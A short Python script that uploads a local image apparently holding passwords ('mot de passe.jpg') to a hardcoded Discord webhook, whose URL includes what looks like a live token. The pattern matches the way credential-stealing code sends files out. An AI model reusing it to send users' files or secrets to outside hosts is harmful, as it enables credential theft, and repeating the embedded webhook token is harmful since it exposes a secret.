import requests

webhook = "https://discord.com/api/webhooks/1356991659857936495/QxuytGZHZw9cEf67EYirjZ44fuGxUG2CdVFIKLBoE3-vwUArjaNzgvi5IYjSyiMLF-KQ"
file_path = "C:/Users/reper/Downloads/Papier important/mot de passe.jpg"

with open(file_path, 'rb') as file:
        files = {
            'file': (file_path, file)
        }

        data = {}

        response = requests.post(webhook, data=data, files=files)